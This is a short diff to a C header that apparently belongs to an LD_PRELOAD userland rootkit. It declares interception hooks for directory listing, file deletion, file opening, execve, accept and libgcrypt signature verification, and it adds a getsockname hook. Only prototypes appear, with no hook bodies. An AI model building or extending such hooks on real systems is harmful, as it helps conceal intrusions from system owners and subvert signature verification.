@@ -34,12 +34,12 @@ int (*o_accept)(int, struct sockaddr *, socklen_t *);
 struct dirent * (*o_readdir)(DIR *);
 int (*o_unlink)(const char *);
 int (*o_unlinkat)(int, const char *, int);
+int (*o_getsockname)(int, struct sockaddr *, socklen_t *);
 FILE * (*o_fopen)(const char *, const char *);
 FILE * (*o_fopen64)(const char *, const char *);
 DIR * (*o_opendir)(const char *);
 int (*o_execve)(const char *, char *const argv[], char *const envp[]);
 gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
-
 
 // functions hooks (interceptions)
 int __lxstat(int version, const char *path, struct stat *buf);
@@ -53,6 +53,7 @@ int openat(int dirfd, const char * pathname, int flags);
 struct dirent * readdir(DIR *p);
 int unlink(const char *pathname);
 int unlinkat(int dirfd, const char * pathname, int flags);
+int getsockname(int socket, struct sockaddr * addr, socklen_t * addrlen);
 FILE * fopen(const char * pathname, const char *mode);
 FILE * fopen64(const char * pathname, const char * mode);
 int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
